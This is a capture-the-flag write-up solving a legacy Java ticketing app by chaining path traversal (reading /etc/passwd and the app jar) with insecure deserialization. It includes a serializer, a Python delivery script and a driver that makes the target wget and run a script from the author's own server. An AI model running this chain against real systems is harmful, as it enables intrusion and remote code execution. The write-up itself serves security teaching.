# Jargon

## Description

This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?

## Analysis

The challenge is a black-box web application implementing a ticketing system.

![home_page](./images/image.png)

The app shows a list of previously created tickets:

![ticket_list](./images/image-1.png)

Two ticket messages in particular drew my attention:

    Internal note: Compiled jar is stored in /app/target/jargon.jar

    DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132)

Each ticket is individually reachable at:
    
    http://<server_ip>/ticket?id=<ticket_id>  

![ticket](./images/image-2.png)

Each ticket attachment can be downloaded at:

    http://<server_ip>/download?id=<ticket_id>

![ticket_download](./images/image-3.png)

## Exploitation Walkthrough

This walkthrough describes the steps I performed to solve the challenge. 
The application contained multiple vulnerabilities which I chained to obtain the flag.

### Path Traversal

The download endpoint initially returned a generic error:

    File not found

Knowing attachments are user-uploadable, I tested for path traversal. 
Supplying an absolute path returned the requested file, confirming directory traversal:

```sh
curl "http://<server_ip>/download?id=/etc/passwd"

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

The endpoint returned `/etc/passwd` contents, so `id` accepts absolute paths and returns files directly if they exist.

### Web App Reversing

Remembering the ticket note:

    Internal note: Compiled jar is stored in /app/target/jargon.jar

I downloaded the web application jar:

```sh
curl "http://<server_ip>/download?id=/app/target/jargon.jar" --output jargon.jar
``` 

I decompiled it with [JADX](https://github.com/skylot/jadx) and found a class named Exploit:

```java
package ctf.jargon;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

/* loaded from: jargon.jar:ctf/jargon/Exploit.class */
public class Exploit implements Serializable {
    private static final long serialVersionUID = 1;
    private String cmd;

    public Exploit(String cmd) {
        this.cmd = cmd;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.cmd);
    }

    public String toString() {
        return "Exploit triggered with command: " + this.cmd;
    }
}
```

The `doPost` handler contains this insecure deserialization pattern:

```java    
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    if (ctype != null && ctype.startsWith("application/octet-stream")) {
        ObjectInputStream objectInputStream = new ObjectInputStream(req.getInputStream());
        // insecure: untrusted deserialization
        resp.getWriter().println(... + objectInputStream.readObject().toString() + ...);
    ...
}
```

The servlet accepts `application/octet-stream` POST bodies and deserializes them directly with 

```java 
ObjectInputStream.readObject()
```

In Java, if a class defines the method 

```java 
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
```

the JVM calls it during deserialization.
Since `readObject` executes automatically, any code in that hook runs when an attacker supplies a crafted serialized object. 
In this case, `Exploit.readObject` invokes `Runtime.getRuntime().exec(cmd)`, enabling Remote Code Execution (RCE) if the server deserializes an instance of that class.

### RCE via Insecure Deserialization

I recreated `ctf.jargon.Exploit` locally and serialized an instance with an attacker-controlled command:

```java
import ctf.jargon.Exploit;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class SerializeExploit {
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Usage: java SerializeExploit <command> <output file>");
            System.exit(1);
        }

        String cmd = args[0];       // cmd to be executed
        String outfile = args[1];   // file to save serialized object

        Exploit e = new Exploit(cmd);

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outfile))) {
            oos.writeObject(e);
        }

        System.out.println("Serialized Exploit written to " + outfile);
    }
}
```

I automated compilation, serialization and delivery with this helper script:

```python
#!/usr/bin/env python3
import requests, sys, subprocess

if len(sys.argv) != 3:
    print("usage: python3 send_serialized.py <url> <cmd>")
    exit(1)

url = sys.argv[1]
cmd = sys.argv[2]

# ---- configuration ----
post_url = f"{url}/contact" 
serialized_obj_file = "./cmd.bin"   

res = subprocess.run([
    "javac",
    "-d", ".",
    "ctf/jargon/Exploit.java",
    "SerializeExploit.java"
], capture_output=True, text=True)

# ---- generate serialized payload ----
res = subprocess.run([f"java", "-cp", ".", "SerializeExploit", f'{cmd}', f"{serialized_obj_file}"])
print("--------")

# read the payload
with open(serialized_obj_file, "rb") as f:
    payload = f.read()

headers = {
    "Content-Type": "application/octet-stream"
}

response = requests.post(post_url, headers=headers, data=payload)

if response.status_code != 200:
    print("fail sending serialized payload")
    exit(1)

print("Serialized payload sent with success:", cmd)
print("--------")
```

The first limitation encountered was the inability to pass **piped or complex commands**, because the Java function

```java
Runtime.getRuntime().exec(String command);
```

does not invoke a shell.
It executes a single program directly, so shell operators like `|`, `&&`, `>`, or wildcards (`*`) are not interpreted. Only simple commands with direct arguments can run this way.

For example, calling a simple program directly works without a shell:

```java
Runtime.getRuntime().exec("touch /tmp/testfile"); // creates the file directly
```

Here, touch is executed as a single program with the argument `/tmp/testfile`. 
No shell is needed because the JVM launches the program directly. 
This concept generalizes to any single executable:

```java
Runtime.getRuntime().exec("/executable arg1 arg2"); // runs /executable with arguments directly
```

### Attempts to upload a shell script

My first approach was to upload a shell script via the web app, make it executable and invoke it via deserialization. After multiple tries I discovered the handler wasn't configured for multipart requests: 

```java
req.getPart("file")
```
returned null, leading to:

And further confirmed by the corresponding log message previously found in one of the ticket, suggesting this reason:

    DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132)

In Java servlets, multipart handling must be explicitly enabled (e.g., `@MultipartConfig` or `web.xml` configuration). Because multipart support was absent, file upload via the web UI was not viable.

### Second approach — remote fetch + execute

For the second approach I deployed a local HTTP server and exposed it via ngrok. I coerced the target to fetch the RCE payload with:

```sh
wget "https://<my_server>/rce"
```

where `rce` contained

```sh
#!/bin/sh
ls -al / >> /tmp/out
echo "-----------------------" >> /tmp/out
cat /flag* >> /tmp/out
```

assuming the flag was stored in root filesystem and the filename started with "flag".

I automated the full workflow with a small driver script that sends serialized commands to the target

```sh
#!/bin/sh
target_url="$1"
server_url="$2"
script="$3"

python3 send_serialized.py "$target_url" "wget $server_url/$script"
python3 send_serialized.py "$target_url" "chmod 777 ./app/$script"
python3 send_serialized.py "$target_url" "/bin/sh /app/$script"
curl "$target_url/download?id=/tmp/out"
```

The sequence downloaded the payload, made it executable, ran it, and retrieved /tmp/out — which contained the flag.

```sh
total 76
drwxr-xr-x    1 root     root          4096 Sep 14 20:23 .
drwxr-xr-x    1 root     root          4096 Sep 14 20:23 ..
drwxr-xr-x    1 root     root          4096 Sep 14 20:25 app
drwxr-xr-x    2 root     root          4096 May  9  2019 bin
drwxr-xr-x    5 root     root           360 Sep 14 20:23 dev
drwxr-xr-x    1 root     root          4096 Sep 14 20:23 etc
-rw-rw-rw-    1 root     root            71 Aug 19 09:23 flag-butlocationhastobesecret-1942e3.txt
drwxr-xr-x    2 root     root          4096 May  9  2019 home
drwxr-xr-x    1 root     root          4096 May 11  2019 lib
drwxr-xr-x    5 root     root          4096 May  9  2019 media
drwxr-xr-x    2 root     root          4096 May  9  2019 mnt
drwxr-xr-x    2 root     root          4096 May  9  2019 opt
dr-xr-xr-x  373 nobody   nobody           0 Sep 14 20:23 proc
drwx------    1 root     root          4096 Aug 19 13:41 root
drwxr-xr-x    1 root     root          4096 Sep 14 20:23 run
drwxr-xr-x    2 root     root          4096 May  9  2019 sbin
drwxr-xr-x    2 root     root          4096 May  9  2019 srv
dr-xr-xr-x   13 nobody   nobody           0 Sep 13 07:39 sys
drwxrwxrwt    1 root     root          4096 Sep 14 20:25 tmp
drwxr-xr-x    1 root     root          4096 May 11  2019 usr
drwxr-xr-x    1 root     root          4096 May  9  2019 var
-----------------------

ctf{a303b9d784195c971e0ff1c1c94723bcc26c4a0b714e919d898a26e82d6c843c}
```
